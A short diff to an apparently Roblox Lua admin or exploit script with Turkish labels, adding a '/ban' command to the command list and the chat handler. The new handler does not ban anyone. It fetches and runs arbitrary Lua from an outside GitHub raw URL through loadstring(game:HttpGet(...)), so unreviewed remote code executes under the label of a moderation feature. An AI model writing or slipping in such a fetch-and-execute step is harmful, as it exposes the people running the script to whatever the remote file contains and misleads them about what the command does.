@@ -11,6 +11,7 @@ Komutlar:
 /antifling
 /spin
 /unspin
+/ban     opsiyonel
 
 Özellikler:
 Yönetici yazısı kalktı
@@ -240,6 +241,9 @@ local function setupCommands(player)
 
         elseif msg == "/kick" then
             LocalPlayer:Kick("Yetkili tarafından atıldınız!")
+
+        elseif msg == "/ban" then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/HilalWare-Official/adam-ak-ll-ism-yok/refs/heads/main/bana.lua",true))()
 
         -- /spin komutu
         elseif string.sub(msg, 1, 6) == "/spin " then
